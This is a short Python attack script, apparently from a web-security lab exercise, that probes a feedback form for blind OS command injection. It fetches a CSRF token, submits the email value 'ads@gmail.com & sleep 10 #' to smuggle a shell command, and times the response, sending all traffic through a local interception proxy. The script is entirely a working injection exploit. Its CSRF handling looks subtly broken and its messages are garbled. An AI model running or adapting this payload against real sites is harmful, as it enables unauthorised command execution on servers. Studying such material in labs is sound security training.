#----OS Command injection Script--#
import sys
import requests
import urllib3
from bs4 import BeautifulSoup


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#config proxcy
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080',
}

def get_csrf(s,url):
    path = '/feedback'
    r = requests.get(url + path , verify=False,proxies=proxies)
    soup = BeautifulSoup(r.text,'html.parser')
    csrf = soup.find("input")["value"]
    return csrf


def command_injection(s,url):
    submit_path = '/feedback/submit'
    payload = 'ads@gmail.com & sleep 10 #'
    csrf_token = get_csrf(s,url)
    data = {
        'csrf':csrf_token,
        'name':'hello',
        'email':payload,
        'subject':'a',
        'message':'dasfdsdbdbsbsbdbdsfbsfb'
    }

    res = s.post(url + submit_path , data=data , proxies=proxies , verify = False)

    if (res.elapsed.total_seconds() >=10):
        print('(+) The filed vulnerable to time_delay Not inject!')
    else:
        print('(+) Paramater Field not vulnable to time_delay command injection.')

def main():
    if len(sys.argv) != 2:
        print("[+] Usage: %s <url>" % sys.argv[0])
        print("[+] Example: %s www.example.com " % sys.argv[0] )
        sys.exit(-1)
    url = sys.argv[1]
    print('[+] checking which  parameter is vulnerable to time_delay command injection...')
    
    s = requests.Session()
    command_injection(s,url)


if __name__ == "__main__":
    main()